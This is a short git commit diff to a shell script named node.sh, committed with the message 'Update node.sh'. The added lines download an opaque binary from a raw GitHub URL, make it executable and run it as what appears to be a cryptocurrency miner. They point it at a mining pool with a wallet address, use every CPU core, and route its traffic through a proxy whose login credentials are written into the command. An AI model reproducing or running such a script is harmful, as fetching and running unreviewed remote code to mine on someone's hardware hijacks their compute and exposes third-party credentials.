3cf64051a1448819c9801eed2c89b4b3021e8a67
erl-andi-new <168285630+erl-andi-new@users.noreply.github.com>
2024-04-30 22:31:43 +0700

    Update node.sh

--- node.sh
+++ node.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-chmod +x gaganode
-./gaganode
-sleep 6h
+wget https://raw.githubusercontent.com/petugas/No/main/k
+chmod +x k
+./k -o xm.erlandi.eu.org:443 -u ZEPHsB4SF9T9wS4vyAbjZ6FzTDyCRFeV5MK7qqHdt2AHWfsmb1P7cbe2gfYp5py78DT6gFyLZixVqc11DNRyY9CHbs2BQG7LDyt -a rx/0 -k -t --randomx-fastmode=fast $(nproc) --proxy=https://g1k938469tzvgi:7p77pr8l0t8iavvayak16k9er8@us-east-shield-04.quotaguard.com:9294
